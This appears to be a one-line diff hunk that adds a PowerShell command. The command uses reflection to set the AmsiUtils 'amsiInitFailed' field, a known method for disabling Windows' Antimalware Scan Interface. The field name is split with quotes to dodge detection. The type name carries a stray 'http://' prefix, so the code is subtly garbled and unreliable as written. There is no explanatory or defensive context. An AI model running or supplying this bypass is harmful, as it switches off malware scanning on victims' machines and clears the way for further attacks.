@@ -1,0 +1,1 @@
+powershell -C [Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsi"Init"Failed','NonPublic,Static').SetValue($null,$true)
